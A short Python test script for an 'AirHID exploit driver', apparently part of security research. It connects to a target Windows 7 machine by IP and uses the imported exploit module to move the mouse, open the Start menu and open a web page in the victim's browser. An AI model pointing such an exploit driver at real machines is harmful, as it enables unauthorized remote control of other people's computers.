import sys
import airhid_remote as remote

IP = "192.168.107.129"
PORT = 13246

"""
Tests the AirHID exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = remote.AirHID_Remote(ip, PORT)
    test_open_start_menu(r)
    test_open_url(r)

def test_open_start_menu(r):
    r.move_mouse(-2000,2000).left_click()

def test_open_url(r):
    r.open_url("http://www.yahoo.com/")

if __name__ == "__main__":
    main()